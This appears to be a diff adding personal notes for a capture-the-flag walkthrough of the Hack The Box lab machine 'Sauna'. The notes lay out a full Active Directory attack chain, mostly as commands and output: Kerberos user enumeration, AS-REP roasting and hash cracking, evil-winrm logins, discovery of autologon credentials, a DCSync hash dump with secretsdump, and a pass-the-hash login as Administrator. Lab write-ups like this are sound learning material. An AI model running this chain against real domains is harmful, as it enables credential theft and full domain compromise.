@@ -1,0 +1,80 @@
+foothold
+--------
+-http://10.10.10.175/about.html founded some possible usernames
+//perform user bruteforcing on kerberos
+-python3 ~/script/windows/kerbrute/kerbrute.py -domain egotistical-bank.local -users usernames.txt
+result
+-------
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Valid user => administrator
+[*] Valid user => fsmith [NOT PREAUTH]	#hmm no preauth so it's vuln to ASREPRoast
+[*] No passwords were discovered :'(
+
+
+
+user
+----
+1)perform ASREPRoast to get fsmith hash
+python ~/script/windows/impacket/examples/GetNPUsers.py egotistical-bank.local/ -usersfile usernames.txt -format john -outputfile hashes.asreproast
+
+2)-crack the hash
+fsmith:Thestrokes23
+
+3)evil-winrm login into it
+evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+
+4)grab user flag
+
+root
+----
+/*
+try to use bloodhound to understand the AD
+//invoke-bloodhound -CollectionMethod All -ldapuser fsmith -ldappass Thestrokes23
+
+type FSMITH@EGOTISTICAL-BANK.LOCAL click on the node and select sibling object in same OU
+then click on EGOTISTICAL-BANK.LOCAL and select first degree controller
+
+we found tht svc_loanmgr have get_changeAll to EGOTISTICAL-BANK.LOCAL, so right click on the line and select help
+then read the abuse_info
+
+result
+======
+With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:
+
+sekurlsa::dcsync /domain:testlab.local /user:Administrator
+//it seems like we can use mimikatz or secretdump.py to dump the credential with this svc_loanmgr account
+*/
+
+1)use windows enumeration tools (PowerUp.ps1)
+//Import-Module ./PowerUp.ps1
+//Invoke-AllChecks
+
+2)gotten a second account credential
+DefaultDomainName    : EGOTISTICALBANK
+DefaultUserName      : EGOTISTICALBANK\svc_loanmanager
+DefaultPassword      : Moneymakestheworldgoround!
+//actual username is svc_loanmgr
+
+3)whoami /priv & whoami /group to perform enumeration
+//group shows NTLM Authentication 
+4)Impacket secretdump.py
+//python3 ~/script/windows/impacket/examples/secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.local/svc_loanmgr@10.10.10.175
+
+Result:
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::
+
+5)Login as admin with evil-winrm
+//evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
+5)grab rootFlag!
+
